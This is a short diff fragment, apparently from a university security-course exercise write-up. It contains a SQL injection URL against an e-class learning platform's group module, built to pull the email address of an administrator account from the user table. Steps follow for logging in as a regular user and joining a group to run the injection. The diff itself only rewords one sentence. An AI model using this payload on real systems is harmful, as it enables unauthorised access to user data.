@@ -19,4 +19,4 @@ http://the-intruders.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=1%20AND%2
 
 http://the-intruders.csec.chatzi.org/modules/group/document.php?userGroupId=1&createDir=the-intruders'%20and%20TRUE=FALSE%20union%20select%20email%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
 First of all we have to login as a regular user. After that we'll choose (Ομάδες Χρηστών - /modules/group) from the course that we want.
-Lastly we are going to sign up to the first(for example) group, and execute the sql injection!
+To sum up we are going to sign up to the first(for example) group, and execute the sql injection!
